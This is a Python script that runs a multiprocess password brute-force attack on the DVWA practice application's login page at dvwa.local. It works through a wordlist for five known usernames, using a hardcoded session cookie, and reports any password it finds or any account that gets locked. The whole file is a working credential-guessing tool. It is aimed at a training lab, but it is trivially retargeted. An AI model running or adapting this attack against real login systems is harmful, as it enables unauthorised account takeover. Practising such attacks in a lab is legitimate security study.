import requests, time

import multiprocessing as mp
from multiprocessing import Value

alphabet = "abcdefghijklmnopqrstuvwxyz"
passwords = []
found_logins = []
n_threads = 0

def try_auth(login, password):
    cookies = dict(PHPSESSID='mo1h5j6d2oubedik8mq0bk56lg', security='low')
    r = requests.get('http://dvwa.local/vulnerabilities/brute/',
     params={'username': login, 'password': password, 'Login': 'Login'},
     cookies=cookies)
    
    if r.text.find("Welcome to the password protected") != -1:
        return 1
    elif r.text.find("Account has been temporary locked.") != -1:
        return 2
    return 0

def get_passw(idx):
    return passwords[idx].strip()

def bruteforce_thread(found, tid, login, start, end):
    for i in range(start, end):
        if found.value:
            break
        password = get_passw(i)
        res = try_auth(login, password)
        if res == 1:
            print(f'Found password for user {login}: {password} (Thread {tid})!')
            found.value = True
            break
        elif res == 2:
            print(f'Account {login} has been locked =( (Thread {tid})!')
            found.value = True #exit
            break

def bruteforce(login):
    start_time = time.perf_counter()

    N = len(passwords)
    per_thread = N // n_threads

    found = Value('b', False)
    threads = []
    start = 0
    for j in range(n_threads):
        end = start + per_thread
        t = mp.Process(target=bruteforce_thread, args=(found, j, login, start, end))
        threads.append(t)
        t.start()
        start = end

    for thread in threads:
        thread.join()

    end_time = time.perf_counter()
    elapsed = end_time - start_time
    print("Exec time: {}.".format(elapsed))


passw_path = input("Enter passwords list file path (default \"passwords.txt\"): ")
if passw_path == "":
    passw_path = "passwords.txt"
f = open(passw_path, "r")
passwords = f.readlines()

n_threads = int(input("Threads count:"))

bruteforce("admin")
bruteforce("1337")
bruteforce("gordonb")
bruteforce("pablo")
bruteforce("smithy")